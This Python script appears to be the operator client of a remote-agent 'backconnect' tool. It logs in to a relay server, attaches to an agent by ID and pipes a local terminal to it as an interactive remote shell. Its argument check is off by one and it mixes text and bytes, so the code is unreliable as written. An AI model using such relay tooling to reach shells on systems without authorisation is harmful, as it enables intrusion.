import paramiko
import os
import termios
import fcntl
from session import Session
import sys
import select

class Shell(object):
    def __init__(self, slave=0, pid=os.getpid()):
        self.termios, self.fcntl = termios, fcntl

        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+", buffering=0)

        self.oldtermios = termios.tcgetattr(self.pty)
        newattr = termios.tcgetattr(self.pty)
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)
    def write(self, data):
        return self.pty.write(data)
    def fileno(self):
        return self.pty.fileno()
    def __del__(self):
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH,self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)
    
if len(sys.argv) < 5:
    print("Too few arguments")
    sys.exit(1)
host = sys.argv[1]
port = sys.argv[2]
username = sys.argv[3]
password = sys.argv[4]
agent_id = sys.argv[5]


channel = Session.init_channel(host, port, username, password)
channel.sendall("31|%s" % agent_id)

exiting = False
inputs = []
inputs.append(channel)
pty = Shell()
inputs.append(pty)
cbuffer = ""

print("[+] Connected")
while not exiting:
    try:
        inputrd, outputrd, errorrd = select.select(inputs,[],[])
    except select.error as e:
        print(str(e))
        break   

    for s in inputrd:
        if s == channel:
            try:
                data = s.recv(1)
            except UnicodeDecodeError:
                print("Failed to decode data")
                print(data)
                continue
            if data == b'':
                print("Backconnect vanished!")
                sys.exit(1)

            cbuffer += data
            pty.write(cbuffer)
            cbuffer = b""
            
        elif s == pty:
            data = s.read(1024)
            channel.send(data)
        else:
            print("Woops finding inputfd")
    cbuffer = ""

